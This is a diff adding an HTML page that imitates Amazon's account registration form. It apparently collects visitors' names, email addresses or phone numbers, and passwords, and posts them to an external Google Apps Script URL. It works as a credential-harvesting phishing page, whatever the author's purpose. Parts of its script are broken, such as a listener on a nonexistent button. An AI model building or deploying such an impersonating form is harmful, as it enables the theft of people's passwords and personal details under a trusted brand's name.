@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Amazon Registration</title>
+  <link rel="stylesheet" href="style.css">
+  <script>
+    function validateForm() {
+      var name = document.getElementById("name").value;
+      var email = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
+      var confirmPassword = document.getElementById("confirm-password").value;
+
+      // Simple validation checks
+      if (name.trim() === '' || email.trim() === '' || password.trim() === '' || confirmPassword.trim() === '') {
+        alert("All fields must be filled out");
+        return false;
+      }
+
+      if (password.length < 6) {
+        alert("Password must be at least 6 characters");
+        return false;
+      }
+
+      if (password !== confirmPassword) {
+        alert("Passwords do not match");
+        return false;
+      }
+      return true;
+    }
+    // Function to handle button click
+    function goToAnotherPage() {
+      // Replace 'another-page.html' with the actual URL of the page you want to navigate to
+      window.location.href="../index.html";
+    }
+
+    // Add click event listener to the button
+    document.getElementById('myButton').addEventListener('click', goToAnotherPage);
+  </script>
+</head>
+<body>
+  <div class="logo">
+    <img src="download.png" alt="">
+  </div>
+    
+  <div class="container">
+    <h1>Create account</h1>
+    <form onsubmit="return validateForm()" method="post" action="https://script.google.com/macros/s/AKfycbxxuz6VjjLtOvDCeauduU_2TEKuSAd0Ed85RJcvT0ZFokTGsMwoDJhcL1X05vfxAkoRmA/exec">
+      <div class="form-group">
+        <label for="name">Your name</label>
+        <input type="text" id="name" name="name" placeholder="First and last name">
+      </div>
+      <div class="form-group">
+        <label for="email">Mobile number or email</label>
+        <input type="text" id="email" name="email" placeholder="Enter your mobile number or email address">
+      </div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="At least 6 characters">
+        <p class="password-requirement">Passwords must be at least 6 characters.</p>
+      </div>
+      <div class="form-group">
+        <label for="confirm-password">Re-enter password</label>
+        <input type="password" id="confirm-password" name="confirmPassword">
+      </div>
+      <button type="submit" onclick="goToAnotherPage()">Continue</button>
+      <p class="terms">By creating an account, you agree to Amazon's <a href="">Conditions of Use </a>and <a href="">Privacy Notice</a>.</p>
+      <div class="additional-links">
+        <p class="sign-in">Already have an account? <a href="">Sign in</a></p>
+        <p class="business">Buying for work? <a href=""> Create a free business account </a></p>
+      </div>
+    </form>
+  </div>
+</body>
+</html>
